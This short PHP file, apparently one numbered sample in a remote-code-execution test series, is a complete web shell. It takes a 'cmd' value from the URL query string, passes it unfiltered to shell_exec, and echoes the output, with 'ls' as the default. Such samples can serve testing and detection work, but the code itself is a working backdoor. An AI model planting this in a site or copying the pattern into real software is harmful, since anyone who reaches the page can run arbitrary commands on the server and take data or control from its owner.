<?php
// RCE test variation #1050
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>